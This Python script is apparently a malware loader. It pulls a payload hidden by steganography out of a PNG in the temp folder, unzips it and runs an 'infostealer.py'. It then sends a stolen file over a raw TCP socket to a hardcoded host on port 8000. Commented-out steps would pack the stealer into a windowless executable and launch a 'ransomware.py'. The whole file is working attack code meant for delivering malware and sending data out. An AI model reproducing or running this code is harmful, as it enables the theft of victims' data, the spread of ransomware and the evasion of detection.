import os.path
from sys import platform
from tkinter import Y
from ctypes import resize
import numpy as np
import cv2
import matplotlib.pyplot as plt
import os 
from termcolor import colored
import random
import os
import socket
from tqdm import tqdm
import tempfile
import subprocess
from zipfile import ZipFile
import time
import requests
random.seed(9)

temp_path = tempfile.gettempdir()

image_Path=temp_path+"\\"+"Image.png"


def extract_Malware_From_Image():
    random.seed(9)
    def Converting_To_Binn(contentt):
        if type(contentt)==str:
            return ''.join([format(ord(i),"08b")for i in contentt])
        elif type(contentt)==bytes or type(contentt)==np.ndarray:
            return [format(i,"08b")for i in contentt ]
        elif type(contentt)==int or type(contentt)==np.uint8:
            return format(contentt,"08b")
        else:
            print(" * Please, Enter Your data as Text")
    def bitstring_to_bytes(s):
        v = int(s, 2)
        b = bytearray()
        while v:
            b.append(v & 0xff)
            v >>= 8
        return bytes(b[::-1])
    image_name=temp_path+"\\"+"Image.png"
    imagge = cv2.imread(image_name)
    key_sec='000000000000000000000000000000000000000000000000000000011111111111111111110000000000001111111111'
    binary_data = ""
    random.seed(9)
    for row in imagge:
        for pixel in row:
            r, g, b = Converting_To_Binn(pixel)
            numr = random.randint(7, 8)
            if r[5]=="0":
                binary_data+=str(r[-2:])
            else:
                if r[numr-1]=="0":
                    binary_data+=str(r[0:2])
                else:
                    binary_data+=str(r[2:4])
            if key_sec in binary_data :
                break
            numg = random.randint(7, 8)
            if g[5]=="0":
                binary_data+=str(g[-2:])
            else:
               if g[numg-1]=="0":
                    binary_data+=str(g[0:2])
               else:
                    binary_data+=str(g[2:4])
            if key_sec in binary_data :
                break
            numb = random.randint(7, 8)
            if b[5]=="0":
                binary_data+=str(b[-2:])
            else:
                if b[numb-1]=="0":
                    binary_data+=str(b[0:2])
                else:
                    binary_data+=str(b[2:4])
            if key_sec in binary_data :
                break
        if key_sec in binary_data:
                break
         
    binary_dataa=binary_data.replace("000000000000000000000000000000000000000000000000000000011111111111111111110000000000001111111111","")
    hh=bitstring_to_bytes(binary_dataa)
    with open (temp_path+"\\malware.zip","wb") as e:
        e.write(hh)

def extract_Malware_From_RAR():
    with ZipFile(temp_path+"\\malware.zip", 'r') as zObject:
     zObject.extractall(path=temp_path)

"""
def convert2exe():
    input_file_path = temp_path+"\\infostealer.py"
    output_file_path = temp_path
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", "--clean", input_file_path])
    subprocess.call(["move", "dist\\" + input_file_path[input_file_path.rfind("/") + 1:input_file_path.rfind(".")] + ".exe", output_file_path])
    print("Output file path:", output_file_path)
 """

def run_Info_By_CMD():
    subprocess.call(["python", temp_path+"\\infostealer.py"])

def Socket():
    FILENAME = temp_path+"\\7_Strong.txt"
    FILESIZE = os.path.getsize(FILENAME)  
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("192.168.27.2",8000))
    data = f"{FILESIZE}"
    client.send(data.encode("utf-8"))
    bar = tqdm(range(FILESIZE), f"Sending {FILENAME}", unit="B", unit_scale=True)
    with open(FILENAME, "r") as f:
        while True:
            data = f.read(1024)
            if not data:
                break
            client.send(data.encode("utf-8"))
            bar.update(len(data))
    client.close()
    
def run_Ransom_By_CMD():
    subprocess.call(["python", temp_path+"\\ransomware.py"])

extract_Malware_From_Image()
extract_Malware_From_RAR()
#convert2exe()
#time.sleep(5)
run_Info_By_CMD()
Socket()
#run_Ransom_By_CMD()